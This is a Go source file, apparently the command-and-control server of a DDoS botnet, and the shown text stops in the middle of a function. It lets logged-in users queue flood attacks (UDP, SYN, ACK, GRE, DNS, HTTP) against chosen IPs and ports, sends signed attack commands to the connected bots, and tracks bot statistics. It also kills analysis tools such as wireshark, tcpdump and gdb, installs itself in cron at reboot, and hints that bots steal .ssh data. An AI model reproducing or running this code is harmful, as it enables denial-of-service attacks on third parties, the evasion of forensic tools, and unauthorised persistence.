package main

import (
	"bufio"
	"context"
	"crypto/ecdsa"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"

	"golang.org/x/crypto/bcrypt"
	"golang.org/x/time/rate"
)

type Config struct {
	UsersFile           string        `json:"users_file"`
	AuditLogFile        string        `json:"audit_log_file"`
	BotServerIP         string        `json:"bot_server_ip"`
	UserServerIP        string        `json:"user_server_ip"`
	BotServerPort       string        `json:"bot_server_port"`
	UserServerPort      string        `json:"user_server_port"`
	CertFile            string        `json:"cert_file"`
	KeyFile             string        `json:"key_file"`
	SessionTimeout      time.Duration `json:"session_timeout"`
	MaxConns            int           `json:"max_conns"`
	MaxReadSize         int           `json:"max_read_size"`
	MaxLogSize          int64         `json:"max_log_size"`
	MaxQueuedAttacks    int           `json:"max_queued_attacks"`
	MaxDailyAttacks     int           `json:"max_daily_attacks"`
	MaxAttackDuration   int           `json:"max_attack_duration"`
	MaxSessionsPerUser  int           `json:"max_sessions_per_user"`
	MinPasswordLength   int           `json:"min_password_length"`
	PasswordComplexity  bool          `json:"password_complexity"`
	MaxConnectionsPerIP int           `json:"max_connections_per_ip"`
	DDOSProtection      bool          `json:"ddos_protection"`
	MaxConnRate         int           `json:"max_conn_rate"`
	SynFloodThreshold   int           `json:"syn_flood_threshold"`
	ResetTokenValidity  time.Duration `json:"reset_token_validity"`
	PinnedCertFile      string        `json:"pinned_cert_file"`
	CommandSigningKey   string        `json:"command_signing_key"`
}

type User struct {
	Username       string    `json:"username"`
	PasswordHash   string    `json:"passwordHash"`
	Expire         time.Time `json:"expire"`
	Level          string    `json:"level"`
	LastLogin      time.Time `json:"lastLogin"`
	FailedAttempts int       `json:"failedAttempts"`
	LockedUntil    time.Time `json:"lockedUntil"`
	CreatedAt      time.Time `json:"createdAt"`
	LastActivity   time.Time `json:"lastActivity"`
}

type client struct {
	conn        net.Conn
	user        User
	sessionID   string
	lastCommand time.Time
	remoteAddr  string
	ctx         context.Context
	cancel      context.CancelFunc
}

type Attack struct {
	Method    string        `json:"method"`
	IP        string        `json:"ip"`
	Port      string        `json:"port"`
	Duration  time.Duration `json:"duration"`
	Start     time.Time     `json:"start"`
	User      string        `json:"user"`
	Conn      net.Conn      `json:"-"`
	QueueTime time.Time     `json:"queueTime"`
	Priority  int           `json:"priority"`
	Signature string        `json:"signature"`
}

type attackManager struct {
	attacks          map[net.Conn]Attack
	attackQueue      []Attack
	scheduledAttacks []Attack
	mutex            sync.RWMutex
}

type AuditLog struct {
	Timestamp time.Time `json:"timestamp"`
	Event     string    `json:"event"`
	User      string    `json:"user"`
	IP        string    `json:"ip"`
	Details   string    `json:"details"`
}

type session struct {
	client     *client
	lastActive time.Time
	loginIP    string
	expires    time.Time
}

type BotStats struct {
	LastSeen     time.Time
	Latency      time.Duration
	Throughput   float64
	RAM          float64
	Cores        int
	Architecture string
}

type rateLimiter struct {
	limiter      *rate.Limiter
	lastSeen     time.Time
	attacksToday int
	lastReset    time.Time
	dailyLimit   int
}

type SessionStore struct {
	store sync.Map
}

type resetToken struct {
	username string
	token    string
	expires  time.Time
	used     bool
}

type AggregatedStats struct {
	AvgLatency    time.Duration
	AvgThroughput float64
	TotalRAM      float64
	TotalCores    int
	HealthyBots   int
	UnhealthyBots int
}

type LogEntry struct {
	entry AuditLog
	done  chan struct{}
}

const (
	ColorStart   = "237"
	ColorMid1    = "240"
	ColorMid2    = "243"
	ColorMid3    = "246"
	ColorEnd     = "249"
	ColorAccent1 = "251"
	ColorAccent2 = "254"
	ColorSuccess = "114"
	ColorError   = "160"
	ColorWarning = "166"
	ColorInfo    = "117"
	ColorSystem  = "183"
)

var (
	cfg                   *Config
	attackManagerInstance = &attackManager{attacks: make(map[net.Conn]Attack)}
	letterBytes           = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	botCount              int
	botCountLock          sync.Mutex
	botConns              []net.Conn
	clients               []*client
	loginRateLimiter      = rate.NewLimiter(rate.Every(5*time.Minute), 5)
	sessionStore          = &SessionStore{}
	serverStartTime       = time.Now()
	ipLimiterMap          = make(map[string]*rateLimiter)
	userLimiterMap        = make(map[string]*rateLimiter)
	limiterMutex          sync.Mutex
	userSessions          = make(map[string]int)
	userSessionLock       sync.Mutex
	connSemaphore         chan struct{}
	blockedIPs            = make(map[string]time.Time)
	blockedIPsLock        sync.Mutex
	botPerformance        = make(map[string]BotStats)
	botStatsLock          sync.Mutex
	resetTokens           = struct {
		sync.RWMutex
		m map[string]resetToken
	}{m: make(map[string]resetToken)}
	allowedMethods = map[string]bool{
		"!udpflood": true, "!udpsmart": true, "!tcpflood": true, "!synflood": true,
		"!ackflood": true, "!greflood": true, "!dns": true, "!http": true,
	}
	reservedIPBlocks = []string{
		"10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8",
		"169.254.0.0/16", "224.0.0.0/4", "::1/128", "fc00::/7", "fe80::/10",
	}
	pinnedCert []byte
	signingKey []byte
	logQueue   chan LogEntry
)

func signCommand(cmd string) string {
	mac := hmac.New(sha256.New, signingKey)
	mac.Write([]byte(cmd))
	return base64.StdEncoding.EncodeToString(mac.Sum(nil))
}

func verifyCommand(cmd, sig string) bool {
	mac := hmac.New(sha256.New, signingKey)
	mac.Write([]byte(cmd))
	expectedSig := mac.Sum(nil)
	decodedSig, err := base64.StdEncoding.DecodeString(sig)
	if err != nil {
		return false
	}
	return hmac.Equal(decodedSig, expectedSig)
}

func asyncLogger() {
	for entry := range logQueue {
		logData, err := json.Marshal(entry.entry)
		if err == nil {
			file, err := os.OpenFile(cfg.AuditLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
			if err == nil {
				file.Write(append(logData, '\n'))
				file.Close()
			}
		}
		close(entry.done)
	}
}

func logAuditEvent(user, event, details string) {
	entry := LogEntry{
		entry: AuditLog{
			Timestamp: time.Now(),
			Event:     event,
			User:      user,
			IP:        "remote",
			Details:   details,
		},
		done: make(chan struct{}),
	}
	logQueue <- entry
	<-entry.done
}

func validateConfig() error {
	if cfg.MaxConns <= 0 {
		return fmt.Errorf("max_conns must be positive")
	}
	if cfg.MaxReadSize <= 0 {
		return fmt.Errorf("max_read_size must be positive")
	}
	if cfg.MaxAttackDuration <= 0 {
		return fmt.Errorf("max_attack_duration must be positive")
	}
	if cfg.MinPasswordLength < 8 {
		return fmt.Errorf("min_password_length must be at least 8")
	}
	if cfg.ResetTokenValidity <= 0 {
		return fmt.Errorf("reset_token_validity must be positive")
	}
	return nil
}

func main() {
	var err error
	cfg, err = loadConfig()
	if err != nil {
		fmt.Printf("Failed to load config: %v\n", err)
		os.Exit(1)
	}
	if err := validateConfig(); err != nil {
		fmt.Printf("Invalid config: %v\n", err)
		os.Exit(1)
	}

	signingKey = []byte(cfg.CommandSigningKey)
	logQueue = make(chan LogEntry, 1000)
	go asyncLogger()

	connSemaphore = make(chan struct{}, cfg.MaxConns)
	if err := checkCertificates(); err != nil {
		logAuditEvent("SYSTEM", "STARTUP", fmt.Sprintf("Certificate error: %v", err))
		os.Exit(1)
	}

	pinnedCert, _ = os.ReadFile(cfg.PinnedCertFile)
	initializeAuditLog()
	initializeRootUser()
	setupFirewallRules()

	go rotateLogs()
	go cleanBlockedIPs()
	go cleanSessions()
	go cleanRateLimiters()
	go updateTitle()
	go attackManagerInstance.checkScheduledAttacks()
	go logSystemStats()
	startServers()
	setupCronJob()
}

func loadConfig() (*Config, error) {
	data, err := os.ReadFile("config.json")
	if err != nil {
		return nil, err
	}
	var config Config
	if err := json.Unmarshal(data, &config); err != nil {
		return nil, err
	}
	return &config, nil
}

func verifyCertificate(rawCerts [][]byte) error {
	if len(rawCerts) == 0 {
		return fmt.Errorf("no certificates presented")
	}
	certPool := x509.NewCertPool()
	if caCert, err := os.ReadFile(cfg.CertFile); err == nil {
		certPool.AppendCertsFromPEM(caCert)
	}
	cert, err := x509.ParseCertificate(rawCerts[0])
	if err != nil {
		return fmt.Errorf("failed to parse peer cert: %v", err)
	}
	if _, err := cert.Verify(x509.VerifyOptions{Roots: certPool}); err != nil {
		return fmt.Errorf("certificate verification failed: %v", err)
	}
	pinnedCertData, err := os.ReadFile(cfg.PinnedCertFile)
	if err != nil {
		return fmt.Errorf("failed to read pinned cert: %v", err)
	}
	pinnedCert, err := x509.ParseCertificate(pinnedCertData)
	if err != nil {
		return fmt.Errorf("failed to parse pinned cert: %v", err)
	}
	switch pubKey := cert.PublicKey.(type) {
	case *rsa.PublicKey:
		pinnedPubKey, ok := pinnedCert.PublicKey.(*rsa.PublicKey)
		if !ok || pubKey.N.Cmp(pinnedPubKey.N) != 0 || pubKey.E != pinnedPubKey.E {
			return fmt.Errorf("certificate doesn't match pinned cert")
		}
	case *ecdsa.PublicKey:
		pinnedPubKey, ok := pinnedCert.PublicKey.(*ecdsa.PublicKey)
		if !ok || pubKey.X.Cmp(pinnedPubKey.X) != 0 || pubKey.Y.Cmp(pinnedPubKey.Y) != 0 {
			return fmt.Errorf("certificate doesn't match pinned cert")
		}
	default:
		return fmt.Errorf("unsupported public key type")
	}
	return nil
}

func getTLSConfig() *tls.Config {
	cert, err := tls.LoadX509KeyPair(cfg.CertFile, cfg.KeyFile)
	if err != nil {
		logAuditEvent("TLS", "CONFIG", fmt.Sprintf("Failed to load certificate: %v", err))
		return nil
	}
	caCert, err := os.ReadFile("certs/ca.crt")
	if err != nil {
		logAuditEvent("TLS", "CONFIG", fmt.Sprintf("Failed to read CA cert: %v", err))
		return nil
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)
	return &tls.Config{
		Certificates:     []tls.Certificate{cert},
		MinVersion:       tls.VersionTLS13,
		ClientAuth:       tls.RequireAndVerifyClientCert,
		ClientCAs:        caCertPool,
		CipherSuites:     []uint16{tls.TLS_AES_128_GCM_SHA256, tls.TLS_AES_256_GCM_SHA384},
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
	}
}

func (s *SessionStore) Get(id string) (*session, bool) {
	val, ok := s.store.Load(id)
	if !ok {
		return nil, false
	}
	return val.(*session), true
}

func (s *SessionStore) Set(id string, sess *session) {
	s.store.Store(id, sess)
}

func (s *SessionStore) Delete(id string) {
	s.store.Delete(id)
}

func (s *SessionStore) Range(f func(key, value interface{}) bool) {
	s.store.Range(f)
}

func setupFirewallRules() error {
	if !cfg.DDOSProtection {
		return nil
	}
	cmds := []string{
		"iptables -N ANTIDDOS",
		"iptables -A ANTIDDOS -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j RETURN",
		"iptables -A ANTIDDOS -p tcp --syn -j DROP",
		"iptables -A ANTIDDOS -p tcp -m conntrack --ctstate NEW -m limit --limit 1/s --limit-burst 3 -j RETURN",
		"iptables -A ANTIDDOS -p tcp -m conntrack --ctstate NEW -j DROP",
		"iptables -A ANTIDDOS -p udp -m limit --limit 1/s --limit-burst 3 -j RETURN",
		"iptables -A ANTIDDOS -p udp -j DROP",
		"iptables -I INPUT -j ANTIDDOS",
	}
	for _, cmd := range cmds {
		if err := exec.Command("sh", "-c", cmd).Run(); err != nil {
			return fmt.Errorf("failed to set iptables rule: %v", err)
		}
	}
	return nil
}

func startServers() {
	tlsConfig := getTLSConfig()
	if tlsConfig == nil {
		logAuditEvent("USER SERVER", "CONNECTION", "Accept error: TLS config is nil")
		return
	}

	go func() {
		userListener, err := tls.Listen("tcp", cfg.UserServerIP+":"+cfg.UserServerPort, tlsConfig)
		if err != nil {
			logAuditEvent("USER SERVER", "CONNECTION", fmt.Sprintf("Accept error: %v", err))
			return
		}
		defer userListener.Close()
		logAuditEvent("SYSTEM", "USER SERVER", fmt.Sprintf("Started on %s:%s", cfg.UserServerIP, cfg.UserServerPort))

		for {
			conn, err := userListener.Accept()
			if err != nil {
				logAuditEvent("BOT SERVER", "STARTUP", fmt.Sprintf("Failed to start listener: %v", err))
				continue
			}
			select {
			case connSemaphore <- struct{}{}:
				go func(c net.Conn) {
					defer func() { <-connSemaphore }()
					handleUserConnection(c)
				}(conn)
			default:
				logAuditEvent("BOT SERVER", "CONNECTION", fmt.Sprintf("Accept error: %v", err))
				conn.Close()
			}
		}
	}()

	botListener, err := tls.Listen("tcp", cfg.BotServerIP+":"+cfg.BotServerPort, tlsConfig)
	if err != nil {
		return
	}
	defer botListener.Close()

	logAuditEvent("SYSTEM", "BOT SERVER", fmt.Sprintf("Started on %s:%s", cfg.BotServerIP, cfg.BotServerPort))

	for {
		conn, err := botListener.Accept()
		if err != nil {
			logAuditEvent("BOT SERVER", "CONNECTION", "Connection limit reached — rejecting")
			continue
		}
		select {
		case connSemaphore <- struct{}{}:
			go func(c net.Conn) {
				defer func() { <-connSemaphore }()
				handleBotConnection(c)
			}(conn)
		default:
			logAuditEvent("USER SERVER", "CONNECTION", "Connection limit reached — rejecting")
			conn.Close()
		}
	}
}

func handleUserConnection(conn net.Conn) {
	defer func() {
		if r := recover(); r != nil {
			logAuditEvent("SYSTEM", "PANIC", fmt.Sprintf("Recovered in handleUserConnection: %v", r))
		}
		conn.Close()
		<-connSemaphore
		removeClient(conn)
	}()

	// Add connection timeout
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	tlsConn, ok := conn.(*tls.Conn)
	if !ok {
		logAuditEvent("SYSTEM", "CONNECTION", "Non-TLS connection attempt")
		return
	}

	if err := tlsConn.Handshake(); err != nil {
		logAuditEvent("SYSTEM", "TLS", fmt.Sprintf("Handshake failed: %v", err))
		return
	}

	remoteAddr := conn.RemoteAddr().String()
	logAuditEvent("SYSTEM", "CONNECTION", fmt.Sprintf("User connected from %s", remoteAddr))
	handleRequest(tlsConn)
}

func handleBotConnection(conn net.Conn) {
	defer func() {
		conn.Close()
		<-connSemaphore
		decrementBotCount()
	}()
	incrementBotCount()
	killAnalysisTools()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go Ping(ctx, conn)
	reader := bufio.NewReaderSize(conn, 4096)
	for {
		conn.SetReadDeadline(time.Now().Add(180 * time.Second))
		line, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if strings.HasPrefix(line, "PONG") {
			handleBotPong(conn, line)
		}
		if strings.HasPrefix(line, "!") {
			processBotMessage(line)
		}
	}
}

func (am *attackManager) checkScheduledAttacks() {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		now := time.Now()
		am.mutex.Lock()
		for i, sa := range am.scheduledAttacks {
			if now.After(sa.Start.Add(sa.Duration)) {
				am.attackQueue = append(am.attackQueue, sa)
				am.scheduledAttacks = append(am.scheduledAttacks[:i], am.scheduledAttacks[i+1:]...)
			}
		}
		am.mutex.Unlock()
	}
}

func generateSessionID() (string, error) {
	b := make([]byte, 32)
	_, err := rand.Read(b)
	if err != nil {
		return "", err
	}
	return base64.URLEncoding.EncodeToString(b), nil
}

func setupCronJob() {
	cmd := exec.Command("crontab", "-l")
	output, _ := cmd.CombinedOutput()
	if !strings.Contains(string(output), os.Args[0]) {
		cmd = exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -", os.Args[0]))
		cmd.Run()
	}
}

func secureDelete(path string) error {
	file, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer file.Close()
	info, err := file.Stat()
	if err != nil {
		return err
	}
	buf := make([]byte, info.Size())
	rand.Read(buf)
	file.Write(buf)
	return os.Remove(path)
}

func getSystemRAM() float64 {
	data, err := os.ReadFile("/proc/meminfo")
	if err != nil {
		return 0
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "MemTotal:") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				kb, _ := strconv.ParseFloat(fields[1], 64)
				return kb / 1024 / 1024
			}
		}
	}
	return 0
}

func getSystemLoad() float64 {
	data, err := os.ReadFile("/proc/loadavg")
	if err != nil {
		return 0
	}
	fields := strings.Fields(string(data))
	load, _ := strconv.ParseFloat(fields[0], 64)
	return load
}

func getUptime() float64 {
	data, err := os.ReadFile("/proc/uptime")
	if err != nil {
		return 0
	}
	fields := strings.Fields(string(data))
	uptime, _ := strconv.ParseFloat(fields[0], 64)
	return uptime
}

func killAnalysisTools() {
	tools := []string{"wireshark", "tcpdump", "strace", "ltrace", "gdb"}
	for _, tool := range tools {
		exec.Command("pkill", "-9", tool).Run()
	}
}

func getCPUCount() int {
	return runtime.NumCPU()
}

func logSystemStats() {
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		stats := fmt.Sprintf("System stats - Load: %.2f, RAM: %.2fGB, Uptime: %.2fh, Cores: %d",
			getSystemLoad(),
			getSystemRAM(),
			getUptime()/3600,
			getCPUCount())
		logAuditEvent("SYSTEM", "STATS", stats)
	}
}

func Ping(ctx context.Context, conn net.Conn) {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			conn.Write([]byte("PING\n"))
		case <-ctx.Done():
			return
		}
	}
}

func handleBotPong(conn net.Conn, readString string) {
	remoteAddr := conn.RemoteAddr().(*net.TCPAddr).IP.String()
	parts := strings.Split(readString, ":")
	if len(parts) < 3 {
		return
	}
	botArch, _ := hex.DecodeString(parts[1])
	statsData, _ := hex.DecodeString(parts[2])
	statParts := strings.Split(string(statsData), "|")
	if len(statParts) < 4 {
		return
	}
	latencySec, _ := strconv.ParseFloat(statParts[0], 64)
	latency := time.Duration(latencySec * float64(time.Second))
	throughput, _ := strconv.ParseFloat(statParts[1], 64)
	ram, _ := strconv.ParseFloat(statParts[2], 64)
	cores, _ := strconv.Atoi(statParts[3])
	botStatsLock.Lock()
	botPerformance[remoteAddr] = BotStats{
		LastSeen:     time.Now(),
		Latency:      latency,
		Throughput:   throughput,
		RAM:          ram,
		Cores:        cores,
		Architecture: string(botArch),
	}
	botStatsLock.Unlock()
}

func processBotMessage(botMessage string) {
	botMessage = strings.TrimPrefix(botMessage, "!")
	if strings.Contains(botMessage, "/exe") ||
		strings.Contains(botMessage, ": directory not empty") ||
		strings.Contains(botMessage, ".ssh from the device") ||
		strings.Contains(botMessage, "data from the device") ||
		strings.Contains(botMessage, ": permission denied") {
		return
	}
	botArguments := strings.SplitN(botMessage, " ", 1)
	if botArguments[0] == "LOG" && len(botArguments) > 1 {
		logAuditEvent("BOT", "LOG", botArguments[1])
	}
}

func getIPLimiter(ip string) *rateLimiter {
	limiterMutex.Lock()
	defer limiterMutex.Unlock()
	if limiter, exists := ipLimiterMap[ip]; exists {
		limiter.lastSeen = time.Now()
		return limiter
	}
	newLimiter := &rateLimiter{limiter: rate.NewLimiter(rate.Every(200*time.Millisecond), 5), lastSeen: time.Now()}
	ipLimiterMap[ip] = newLimiter
	return newLimiter
}

func getUserLimiter(username string) *rateLimiter {
	limiterMutex.Lock()
	defer limiterMutex.Unlock()
	if limiter, exists := userLimiterMap[username]; exists {
		limiter.lastSeen = time.Now()
		return limiter
	}
	limit := rate.Every(1 * time.Second)
	burst := 10
	dailyAttacks := cfg.MaxDailyAttacks
	users := []User{}
	if data, err := os.ReadFile(cfg.UsersFile); err == nil {
		json.Unmarshal(data, &users)
		for _, user := range users {
			if user.Username == username {
				switch user.Level {
				case "Owner":
					limit = rate.Every(500 * time.Millisecond)
					burst = 20
					dailyAttacks = cfg.MaxDailyAttacks * 3
				case "Admin":
					limit = rate.Every(750 * time.Millisecond)
					burst = 15
					dailyAttacks = cfg.MaxDailyAttacks * 2
				}
				break
			}
		}
	}
	newLimiter := &rateLimiter{
		limiter:      rate.NewLimiter(limit, burst),
		lastSeen:     time.Now(),
		attacksToday: 0,
		lastReset:    time.Now(),
		dailyLimit:   dailyAttacks,
	}
	userLimiterMap[username] = newLimiter
	return newLimiter
}

func (rl *rateLimiter) canAttack() bool {
	if time.Now().Day() != rl.lastReset.Day() {
		rl.attacksToday = 0
		rl.lastReset = time.Now()
	}
	return rl.attacksToday < rl.dailyLimit
}

func (user *User) GetLevel() int {
	switch user.Level {
	case "Owner":
		return 0
	case "Admin":
		return 1
	case "Pro":
		return 2
	default:
		return 3
	}
}

func getAggregatedStats() AggregatedStats {
	botStatsLock.Lock()
	defer botStatsLock.Unlock()
	var stats AggregatedStats
	count := 0
	for _, s := range botPerformance {
		stats.AvgLatency += s.Latency
		stats.AvgThroughput += s.Throughput
		stats.TotalRAM += s.RAM
		stats.TotalCores += s.Cores
		count++
	}
	if count > 0 {
		stats.AvgLatency /= time.Duration(count)
		stats.AvgThroughput /= float64(count)
	}
	stats.HealthyBots = count
	stats.UnhealthyBots = getBotCount() - count
	return stats
}

func generateSecureString(n int) (string, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return "", err
	}
	for idx := range b {
		b[idx] = letterBytes[b[idx]%byte(len(letterBytes))]
	}
	return string(b), nil
}

func AuthUser(username, password string) (bool, *User) {
	users := []User{}
	usersFile, err := os.ReadFile(cfg.UsersFile)
	if err != nil {
		return false, nil
	}
	json.Unmarshal(usersFile, &users)
	for idx, user := range users {
		if user.Username == username {
			if time.Now().Before(user.LockedUntil) {
				logAuditEvent(username, "AUTH", "Account locked due to too many failed attempts")
				return false, nil
			}
			if err := bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(password)); err == nil {
				users[idx].FailedAttempts = 0
				users[idx].LastLogin = time.Now()
				users[idx].LastActivity = time.Now()
				saveUsers(users)
				logAuditEvent(username, "AUTH", "Login successful")
				return true, &users[idx]
			}
			users[idx].FailedAttempts++
			if users[idx].FailedAttempts >= 5 {
				users[idx].LockedUntil = time.Now().Add(30 * time.Minute)
				logAuditEvent(username, "AUTH", "Account locked for 30 minutes due to too many failed attempts")
			}
			saveUsers(users)
			logAuditEvent(username, "AUTH", "Invalid password")
			return false, nil
		}
	}
	logAuditEvent(username, "AUTH", "User not found")
	return false, nil
}

func saveUsers(users []User) {
	bytes, _ := json.MarshalIndent(users, "", "  ")
	os.WriteFile(cfg.UsersFile, bytes, 0600)
}

func setTitle(conn net.Conn, title string) {
	conn.Write([]byte(fmt.Sprintf("\033]0;%s\007", title)))
}

func updateTitle() {
	spinChars := []rune{'⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'}
	spinIndex := 0
	for {
		for _, c := range clients {
			attackCount := attackManagerInstance.countAttacks()
			botCount := getBotCount()
			uptime := time.Since(serverStartTime).Round(time.Second)
			spinChar := spinChars[spinIndex]
			title := fmt.Sprintf("%c━━━%c━━[User: %s]━━%c━━[Bots: %d]━━%c━━[Attacks: %d/%d]━━%c━━[Uptime: %s]━━%c━━━%c",
				spinChar, spinChar, c.user.Username, spinChar, botCount, spinChar,
				attackCount, attackManagerInstance.getMaxAttacks(), spinChar, uptime, spinChar, spinChar)
			setTitle(c.conn, title)
		}
		spinIndex = (spinIndex + 1) % len(spinChars)
		time.Sleep(100 * time.Millisecond)
	}
}

func (am *attackManager) removeAttack(conn net.Conn) {
	am.mutex.Lock()
	defer am.mutex.Unlock()
	delete(am.attacks, conn)
	am.processQueue()
}

func (am *attackManager) processQueue() {
	if len(am.attacks) < am.getMaxAttacks() && len(am.attackQueue) > 0 {
		sort.Slice(am.attackQueue, func(i, j int) bool {
			return am.attackQueue[i].Priority > am.attackQueue[j].Priority
		})
		nextAttack := am.attackQueue[0]
		am.attackQueue = am.attackQueue[1:]
		launchAttack(nextAttack.Conn, nextAttack)
		msg := fmt.Sprintf("Your attack on %s:%s has started (was queued for %s)",
			nextAttack.IP, nextAttack.Port, time.Since(nextAttack.QueueTime).Round(time.Second))
		for _, c := range clients {
			if c.user.Username == nextAttack.User {
				animateText(c.conn, msg, 15*time.Millisecond, ColorSuccess)
				break
			}
		}
	}
}

func launchAttack(conn net.Conn, attack Attack) {
	attackManagerInstance.attacks[conn] = attack
	cmd := fmt.Sprintf("%s %s %s %s", attack.Method, attack.IP, attack.Port,
		strconv.Itoa(int(attack.Duration.Seconds())))
	sig := signCommand(cmd)
	sendToBots(fmt.Sprintf("%s %s", cmd, sig), attack.User)
	go func() {
		time.Sleep(attack.Duration)
		attackManagerInstance.removeAttack(conn)
		logAuditEvent(attack.User, "ATTACK", fmt.Sprintf("Attack finished on %s:%s", attack.IP, attack.Port))
		animateText(conn, "Attack has automatically finished and was removed.", 15*time.Millisecond, ColorSuccess)
	}()
}

func (am *attackManager) getAttacks() []Attack {
	am.mutex.RLock()
	defer am.mutex.RUnlock()
	attacks := make([]Attack, 0, len(am.attacks))
	for _, a := range am.attacks {
		attacks = append(attacks, a)
	}
	return attacks
}

func (am *attackManager) countAttacks() int {
	am.mutex.RLock()
	defer am.mutex.RUnlock()
	return len(am.attacks)
}

func (am *attackManager) getMaxAttacks() int {
	return cfg.MaxQueuedAttacks
}

func (am *attackManager) getUserQueuedAttacks(username string) []Attack {
	am.mutex.RLock()
	defer am.mutex.RUnlock()
	var userAttacks []Attack
	for _, a := range am.attackQueue {
		if a.User == username {
			userAttacks = append(userAttacks, a)
		}
	}
	return userAttacks
}

func (am *attackManager) cancelQueuedAttack(username string, index int) bool {
	am.mutex.Lock()
	defer am.mutex.Unlock()
	found := 0
	for idx, a := range am.attackQueue {
		if a.User == username {
			if found == index {
				am.attackQueue = append(am.attackQueue[:idx], am.attackQueue[idx+1:]...)
				return true
			}
			found++
		}
	}
	return false
}

func colorizeText(text, colorCode string) string {
	return fmt.Sprintf("\033[38;5;%sm%s\033[0m", colorCode, text)
}

func animateText(conn net.Conn, text string, delay time.Duration, color string) {
	conn.Write([]byte(fmt.Sprintf("\033[38;5;%sm", color)))
	for idx := 0; idx < len(text); idx++ {
		conn.Write([]byte(string(text[idx])))
		time.Sleep(delay)
	}
	conn.Write([]byte("\033[0m\r\n"))
}

func sendToBots(command, user string) {
	logAuditEvent(user, "COMMAND", fmt.Sprintf("Sent command to bots: %s", command))
	for _, botConn := range botConns {
		botConn.Write([]byte(command + "\r\n"))
	}
}

func removeClient(conn net.Conn) {
	for idx, c := range clients {
		if c.conn == conn {
			clients = append(clients[:idx], clients[idx+1:]...)
			break
		}
	}
}

func cleanSessions() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		now := time.Now()
		sessionStore.Range(func(key, value interface{}) bool {
			sess := value.(*session)
			if now.Sub(sess.lastActive) > cfg.SessionTimeout || now.After(sess.expires) {
				if keyStr, ok := key.(string); ok {
					sessionStore.Delete(keyStr)
				}
				userSessionLock.Lock()
				userSessions[sess.client.user.Username]--
				userSessionLock.Unlock()
				logAuditEvent(sess.client.user.Username, "SESSION", "Session expired due to inactivity")
			}
			return true
		})
	}
}

func cleanRateLimiters() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		limiterMutex.Lock()
		now := time.Now()
		for ip, limiter := range ipLimiterMap {
			if now.Sub(limiter.lastSeen) > 5*time.Minute {
				delete(ipLimiterMap, ip)
			}
		}
		for user, limiter := range userLimiterMap {
			if now.Sub(limiter.lastSeen) > 5*time.Minute {
				delete(userLimiterMap, user)
			}
		}
		limiterMutex.Unlock()
	}
}

func cleanBlockedIPs() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()
	for range ticker.C {
		blockedIPsLock.Lock()
		for ip, blockTime := range blockedIPs {
			if time.Since(blockTime) > 24*time.Hour {
				delete(blockedIPs, ip)
			}
		}
		blockedIPsLock.Unlock()
	}
}

func getBotCount() int {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	return botCount
}

func incrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	botCount++
}

func decrementBotCount() {
	botCountLock.Lock()
	defer botCountLock.Unlock()
	botCount--
}

func handleRequest(conn net.Conn) {
	reader := bufio.NewReader(conn)
	conn.Write([]byte("\033]0;Authentication Required\007"))
	readString, err := reader.ReadString('\n')
	if err != nil {
		return
	}
	readString = strings.TrimSpace(readString)
	if strings.HasPrefix(readString, "PONG") {
		handleBotPong(conn, readString)
		return
	}
	if strings.HasPrefix(readString, "loginforme") {
		if authed, client := authUser(conn); authed {
			handleClientSession(conn, client)
		}
	}
}

func handleClientSession(conn net.Conn, c *client) {
	defer func() {
		userSessionLock.Lock()
		userSessions[c.user.Username]--
		userSessionLock.Unlock()
		sessionStore.Delete(c.sessionID)
		c.cancel()
		logAuditEvent(c.user.Username, "SESSION", "Session terminated")
	}()
	reader := bufio.NewReader(conn)
	for {
		conn.Write([]byte(getPrompt(c.user.GetLevel())))
		readString, _ := reader.ReadString('\n')
		readString = strings.TrimSpace(readString)
		parts := strings.Fields(readString)
		if len(parts) < 1 {
			continue
		}
		ipLimiter := getIPLimiter(c.remoteAddr)
		userLimiter := getUserLimiter(c.user.Username)
		if !ipLimiter.limiter.Allow() || !userLimiter.limiter.Allow() {
			animateText(conn, "Rate limit exceeded. Please wait...\r", 15*time.Millisecond, ColorWarning)
			continue
		}
		if time.Since(c.lastCommand) < 2*time.Second {
			animateText(conn, "Command rate limited. Please wait...\r", 15*time.Millisecond, ColorWarning)
			continue
		}
		c.lastCommand = time.Now()
		command := parts[0]
		switch strings.ToLower(command) {
		case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
			handleAttackCommand(conn, parts, c)
		case "ongoing":
			displayOngoingAttacks(conn)
		case "queue":
			displayQueuedAttacks(conn, c)
		case "cancel":
			handleCancelAttack(conn, parts, c)
